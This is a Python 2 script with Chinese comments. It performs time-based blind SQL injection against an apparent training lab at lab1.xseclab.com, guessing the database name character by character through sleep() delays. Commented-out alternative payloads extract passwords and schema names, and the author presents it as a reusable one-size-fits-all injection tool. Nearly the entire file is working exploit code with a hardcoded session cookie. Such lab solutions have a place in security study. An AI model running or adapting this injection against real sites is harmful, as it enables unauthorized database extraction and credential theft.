#-*-coding:utf-8-*-
#就直接改限制条件跑吧  就这一个脚本吃遍天吧，以后学了线程来改吧
import requests  
import time  
import string
  
payloads = string.digits + string.letters + "!@#$%^&()_+{}-=*"  #不区分大小写的  
print string.digits
print string.letters
print payloads
  
flag = ""  
key=0  
headers = {"Host": "lab1.xseclab.com",  
                   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0",  
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",  
                   "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",   
                   "Cookie": "PHPSESSID=2955ff86eff4aafcb422eabe3bbd7a73",  
                   "Connection": "keep-alive",  
                   } 
print("Start")  
for i in range(1,50):  
    if key == 1:  
        break  
    for payload in payloads:  
        starttime = time.time()#记录当前时间  
         
        url = "http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=gues' or if(substr((SELECT concat(database())),%s,1)='%s',sleep(10),1)  %%23 " %(i,payload)#数据库  

        #用户名一定要置为空,并且 %s  '%s'要单引号  前面的用户名正确 要用and连接 涉及到and or的先后顺序,以及执行与否
        #and case when(substr(password,%s,1)='%s') then sleep(10) else sleep(0) end
        #取其他的数据库  if(substr((select schema_name from information_schema.schemata limit 0,1),%s,1)='%s',sleep(10),0) and ''=' &pass= &action=login
        res = requests.get(url, headers=headers)  #这里是get注入
        if time.time() - starttime > 10:     #如果是bool注入  改为if error in res.content
            flag += payload  
            print("pwd is:%s"%flag)  
            break  
        else:  
            if payload == '*':  
                key = 1  
                break  
print('[Finally] current pwd is %s'% flag)



